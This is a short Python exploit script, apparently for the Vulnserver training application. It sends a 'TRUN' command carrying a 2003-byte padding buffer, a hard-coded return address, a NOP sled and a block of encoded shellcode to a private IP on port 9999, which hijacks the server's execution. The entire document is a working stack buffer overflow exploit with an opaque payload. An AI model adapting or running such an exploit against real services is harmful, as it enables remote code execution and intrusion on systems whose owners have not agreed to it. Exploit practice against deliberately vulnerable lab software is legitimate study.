#!/usr/bin/python
import sys, socket


targetip = '192.168.1.136'
port = 9999
ptr_addr = "\xaf\x11\x50\x62"

overflow = ("\xbf\x9b\x7c\xaf\xae\xdb\xc0\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x7a\x12\x03\x7a\x12\x83\x71\x80\x4d\x5b\x79\x91\x10"
"\xa4\x81\x62\x75\x2c\x64\x53\xb5\x4a\xed\xc4\x05\x18\xa3\xe8"
"\xee\x4c\x57\x7a\x82\x58\x58\xcb\x29\xbf\x57\xcc\x02\x83\xf6"
"\x4e\x59\xd0\xd8\x6f\x92\x25\x19\xb7\xcf\xc4\x4b\x60\x9b\x7b"
"\x7b\x05\xd1\x47\xf0\x55\xf7\xcf\xe5\x2e\xf6\xfe\xb8\x25\xa1"
"\x20\x3b\xe9\xd9\x68\x23\xee\xe4\x23\xd8\xc4\x93\xb5\x08\x15"
"\x5b\x19\x75\x99\xae\x63\xb2\x1e\x51\x16\xca\x5c\xec\x21\x09"
"\x1e\x2a\xa7\x89\xb8\xb9\x1f\x75\x38\x6d\xf9\xfe\x36\xda\x8d"
"\x58\x5b\xdd\x42\xd3\x67\x56\x65\x33\xee\x2c\x42\x97\xaa\xf7"
"\xeb\x8e\x16\x59\x13\xd0\xf8\x06\xb1\x9b\x15\x52\xc8\xc6\x71"
"\x97\xe1\xf8\x81\xbf\x72\x8b\xb3\x60\x29\x03\xf8\xe9\xf7\xd4"
"\xff\xc3\x40\x4a\xfe\xeb\xb0\x43\xc5\xb8\xe0\xfb\xec\xc0\x6a"
"\xfb\x11\x15\x3c\xab\xbd\xc6\xfd\x1b\x7e\xb7\x95\x71\x71\xe8"
"\x86\x7a\x5b\x81\x2d\x81\x0c\x6e\x19\x88\x4c\x06\x58\x8a\x5d"
"\x8b\xd5\x6c\x37\x23\xb0\x27\xa0\xda\x99\xb3\x51\x22\x34\xbe"
"\x52\xa8\xbb\x3f\x1c\x59\xb1\x53\xc9\xa9\x8c\x09\x5c\xb5\x3a"
"\x25\x02\x24\xa1\xb5\x4d\x55\x7e\xe2\x1a\xab\x77\x66\xb7\x92"
"\x21\x94\x4a\x42\x09\x1c\x91\xb7\x94\x9d\x54\x83\xb2\x8d\xa0"
"\x0c\xff\xf9\x7c\x5b\xa9\x57\x3b\x35\x1b\x01\x95\xea\xf5\xc5"
"\x60\xc1\xc5\x93\x6c\x0c\xb0\x7b\xdc\xf9\x85\x84\xd1\x6d\x02"
"\xfd\x0f\x0e\xed\xd4\x8b\x2e\x0c\xfc\xe1\xc6\x89\x95\x4b\x8b"
"\x29\x40\x8f\xb2\xa9\x60\x70\x41\xb1\x01\x75\x0d\x75\xfa\x07"
"\x1e\x10\xfc\xb4\x1f\x31")

shellcode = "A" * 2003 +  ptr_addr + "\x90" * 32 + overflow

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((targetip, port))
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()


